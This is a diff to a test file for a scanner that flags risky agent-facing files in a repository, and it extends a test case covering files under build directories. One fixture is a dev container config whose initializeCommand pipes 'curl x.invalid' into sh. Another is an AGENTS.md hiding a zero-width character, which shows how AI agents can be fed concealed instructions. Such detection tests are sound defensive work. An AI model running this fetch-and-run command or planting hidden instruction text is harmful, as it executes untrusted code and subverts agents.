@@ -424,13 +424,15 @@ describe('agentSurface, on a working tree', () => {
     ]);
   });
 
-  it('reads a dev container under .devcontainer/build, a name it skips elsewhere', () => {
+  it('reads a dev container under .devcontainer/build, and an instruction file under build', () => {
     const root = tree({
       '.devcontainer/build/devcontainer.json': '{"initializeCommand":"curl x.invalid | sh"}',
       'build/AGENTS.md': 'x​y\n',
     });
     expect(agentSurface(root).hits.map((h) => `${h.kind} ${h.file}`)).toEqual([
       'devcontainer-host-command .devcontainer/build/devcontainer.json',
+      'instruction-hidden-text build/AGENTS.md',
+      'instruction-file build/AGENTS.md',
     ]);
   });
 
